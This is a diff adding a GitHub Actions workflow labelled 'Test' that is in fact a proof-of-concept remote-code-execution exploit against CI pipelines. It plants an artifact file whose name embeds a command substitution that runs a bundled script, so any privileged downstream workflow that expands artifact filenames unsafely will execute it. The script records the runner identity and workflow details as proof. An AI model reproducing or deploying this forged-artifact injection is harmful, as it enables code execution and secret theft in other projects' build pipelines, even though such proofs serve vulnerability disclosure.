@@ -1,0 +1,44 @@
+name: Test
+
+on:
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Craft artifact
+        env:
+          PR_NUMBER: ${{ github.event.number }}
+        run: |
+          mkdir -p out
+          cat > out/p.sh <<'SCRIPT'
+          #!/bin/bash
+          {
+            echo "### RCE PROOF (forged artifact filename executed)"
+            echo "- id: $(id)"
+            echo "- hostname: $(hostname)"
+            echo "- repo: $GITHUB_REPOSITORY"
+            echo "- workflow: $GITHUB_WORKFLOW"
+            echo "- event: $GITHUB_EVENT_NAME"
+            echo "- run_id: $GITHUB_RUN_ID"
+            echo "- job: $GITHUB_JOB"
+            echo "- trigger_workflow: $(jq -r '.workflow_run.name' "$GITHUB_EVENT_PATH" 2>/dev/null)"
+            echo "- trigger_conclusion: $(jq -r '.workflow_run.conclusion' "$GITHUB_EVENT_PATH" 2>/dev/null)"
+            echo "- trigger_run_id: $(jq -r '.workflow_run.id' "$GITHUB_EVENT_PATH" 2>/dev/null)"
+          } >> "$GITHUB_STEP_SUMMARY"
+          echo /tmp/content/content/x
+          SCRIPT
+          chmod +x out/p.sh
+          echo "hello from forged artifact" > out/x.txt
+          printf '%s' "$PR_NUMBER" > out/pr_number.txt
+          : > 'out/$(bash${IFS}/tmp/content/content/p.sh).txt'
+          ls -la out
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content
+          path: out
